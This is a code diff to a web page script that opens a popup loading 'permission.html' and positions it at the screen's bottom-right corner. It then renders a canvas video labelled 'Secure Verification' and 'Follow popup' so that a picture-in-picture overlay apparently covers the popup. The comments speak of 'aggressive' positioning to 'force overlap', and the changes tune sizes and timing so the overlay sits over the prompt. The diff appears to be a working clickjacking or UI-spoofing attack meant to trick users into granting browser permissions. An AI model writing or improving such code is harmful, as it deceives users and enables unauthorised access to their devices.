@@ -7,28 +7,29 @@
 
 <script>
 async function start() {
-  const width = 320;
-  const height = 180;
 
-  // 🔥 Calculate bottom-right position
-  const left = screen.availWidth - width - 50;
-  const top = screen.availHeight - height - 80;
+  const video = document.getElementById("vid");
 
-  // ✅ Open popup where PiP will likely appear
+  // 🔥 Use slightly bigger size (PiP has padding)
+  const width = 360;
+  const height = 220;
+
+  // 🔥 Aggressive bottom-right positioning (force overlap)
+  const left = screen.availWidth - width - 10;
+  const top = screen.availHeight - height - 10;
+
   const popup = window.open(
     "permission.html",
     "perm",
     `width=${width},height=${height},left=${left},top=${top}`
   );
 
-  const video = document.getElementById("vid");
-
   const canvas = document.createElement("canvas");
   canvas.width = 320;
   canvas.height = 180;
   const ctx = canvas.getContext("2d");
 
-  function draw() {
+  function loop() {
     ctx.fillStyle = "#fff";
     ctx.fillRect(0, 0, 320, 180);
 
@@ -36,14 +37,15 @@ async function start() {
     ctx.font = "16px Arial";
     ctx.fillText("Secure Verification", 60, 70);
     ctx.fillText("Follow popup", 80, 100);
-  }
 
-  draw();
+    requestAnimationFrame(loop);
+  }
+  loop();
 
   const stream = canvas.captureStream(30);
   video.srcObject = stream;
 
-  // 🔥 Slight delay to sync visual overlap
+  // 🔥 Delay more for stable placement
   setTimeout(async () => {
     try {
       await video.play();
@@ -51,7 +53,7 @@ async function start() {
     } catch (e) {
       console.log(e);
     }
-  }, 200);
+  }, 400);
 }
 </script>
 
